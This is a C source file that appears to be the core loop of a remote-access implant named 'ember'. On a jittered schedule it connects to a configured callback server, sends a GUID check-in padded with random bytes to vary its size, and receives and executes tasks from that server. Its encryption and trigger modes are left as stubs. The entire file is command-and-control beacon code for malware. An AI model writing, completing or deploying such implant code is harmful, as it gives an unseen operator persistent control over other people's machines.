#define _POSIX_C_SOURCE 200809L // NOLINT

#include <assert.h>
#include <netinet/in.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "errors.h"
#include "settings.h"
#include "task.h"
#include "utils.h"

static int send_checkin(int sock, uint32_t guid[4]);
static int handle_connection(int sock, settings_t *p_settings);
static int do_beacon(settings_t *p_settings);
static int callback(settings_t *p_settings);
static int sleep_until_next_callback(settings_t *p_settings);

enum
{
    MSEC_PER_SEC = 1000,
    MSEC_TO_NSEC = 1000000,
    NSEC_PER_SEC = 1000000000,
    CHECKIN_BUF_SIZ = 255,
};

typedef struct
{
    settings_t settings;
} ember_t;

static volatile sig_atomic_t g_interrupt_flag = 0;

int ember_run(settings_t *p_settings)
{
    int ret = EMBER_SUCCESS;

    ember_t ember = {0};
    memcpy(&ember.settings, p_settings, sizeof(settings_t));

    (void)clock_gettime(CLOCK_MONOTONIC, &ember.settings.next_callback);

    while (EMBER_SUCCESS == ret)
    {
        ret = callback(&ember.settings);

        if ((EMBER_SUCCESS == ret) && (BEACON == ember.settings.mode))
        {
            ret = sleep_until_next_callback(&ember.settings);
        }
    }

    return ret;
}

static void subtract_timespec(struct timespec *p_dest, struct timespec time_1, struct timespec time_2)
{
    if (time_1.tv_nsec < time_2.tv_nsec)
    {
        p_dest->tv_sec = time_1.tv_sec - time_2.tv_sec - 1;
        p_dest->tv_nsec = (time_1.tv_nsec + NSEC_PER_SEC) - time_2.tv_nsec;
    }
    else
    {
        p_dest->tv_sec = time_1.tv_sec - time_2.tv_sec;
        p_dest->tv_nsec = time_1.tv_nsec - time_2.tv_nsec;
    }
}

static void add_timespec(struct timespec *p_dest, struct timespec time_1, struct timespec time_2)
{
    p_dest->tv_sec = time_1.tv_sec + time_2.tv_sec;
    p_dest->tv_nsec = time_1.tv_nsec + time_2.tv_nsec;

    if (NSEC_PER_SEC <= p_dest->tv_nsec)
    {
        p_dest->tv_sec += 1;
        p_dest->tv_nsec -= NSEC_PER_SEC;
    }
}

static int sleep_until_next_callback(settings_t *p_settings)
{
    assert(NULL != p_settings);

    int ret = EMBER_SUCCESS;

    add_timespec(&p_settings->next_callback, p_settings->next_callback, p_settings->interval);

    struct timespec now = {0};
    (void)clock_gettime(CLOCK_MONOTONIC, &now);
    while ((p_settings->next_callback.tv_sec < now.tv_sec) ||
           ((p_settings->next_callback.tv_sec == now.tv_sec) && (p_settings->next_callback.tv_nsec < now.tv_nsec)))
    {
        add_timespec(&p_settings->next_callback, p_settings->next_callback, p_settings->interval);
    }

    int64_t random_num = 0;
    // TODO: Replace with more portable randombytes()
    (void)getrandom(&random_num, sizeof(int64_t), 0);
    int64_t jitter_msec = (random_num % ((p_settings->window.tv_sec * 2 * MSEC_PER_SEC) + 1)) -
                          (p_settings->window.tv_sec * MSEC_PER_SEC);
    struct timespec jitter_ts = {jitter_msec / MSEC_PER_SEC, (jitter_msec % MSEC_PER_SEC) * MSEC_TO_NSEC};
    if (0 > jitter_msec)
    {
        jitter_ts.tv_sec -= 1;
        jitter_ts.tv_nsec = (NSEC_PER_SEC + jitter_ts.tv_nsec);
    }

    struct timespec sleep_time = {0};
    add_timespec(&sleep_time, p_settings->next_callback, jitter_ts);

    if (-1 == nanosleep(&sleep_time, NULL))
    {
        DEBUG_PERROR("nanosleep");
        ret = -EMBER_ERROR;
    }

    return ret;
}

static int send_checkin(int sock, uint32_t guid[4])
{
    int ret = EMBER_SUCCESS;

    uint8_t checkin_buf[CHECKIN_BUF_SIZ] = {0};
    uint8_t pad_len = (uint8_t)rand() % ONE_HUNDRED; // NOLINT Up to 100 bytes of random padding

    size_t total_len = sizeof(uint8_t) + (4 * sizeof(uint32_t)) + pad_len;

    memcpy(checkin_buf, guid, sizeof(uint32_t) * 4);
    memcpy(checkin_buf + (sizeof(uint32_t) * 4), &pad_len, sizeof(uint8_t));

    if ((ssize_t)total_len != utils_sendall(sock, checkin_buf, total_len, 0))
    {
        ret = -EMBER_ERROR;
    }

    return ret;
}

static int handle_connection(int sock, settings_t *p_settings)
{
    assert(NULL != p_settings);

    int ret = EMBER_SUCCESS;

    // Crypto and auth here

    ret = send_checkin(sock, p_settings->guid);

    if (EMBER_SUCCESS == ret)
    {
        ret = task_receive_and_execute(sock, p_settings);
    }

    DEBUG_PERROR("exit");
    return ret;
}

static int do_beacon(settings_t *p_settings)
{
    assert(NULL != p_settings);

    int ret = EMBER_SUCCESS;

    int sock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (-1 == sock)
    {
        DEBUG_PERROR("socket");
        ret = -EMBER_ERROR;
    }

    if (EMBER_SUCCESS == ret)
    {
        if (-1 == connect(sock, (struct sockaddr *)&p_settings->callback_location, sizeof(struct sockaddr_in)))
        {
            DEBUG_PERROR("connect");
            ret = -EMBER_ERROR;
        }
    }

    if (EMBER_SUCCESS == ret)
    {
        ret = handle_connection(sock, p_settings);
    }

    if (-1 != sock)
    {
        close(sock);
    }

    DEBUG_PERROR("exit");
    return ret;
}

static int callback(settings_t *p_settings)
{
    assert(NULL != p_settings);

    int ret = EMBER_SUCCESS;

    if (BEACON == p_settings->mode)
    {
        ret = do_beacon(p_settings);
    }
    else if (TRIGGER == p_settings->mode)
    {
        // Become triggerable (or do I do a multi-threaded wakeup via signal?)
    }
    else
    {
        DEBUG_MSG("Invalid callback mode");
        ret = -EMBER_ERROR;
    }

    DEBUG_PERROR("exit");

    return ret;
}
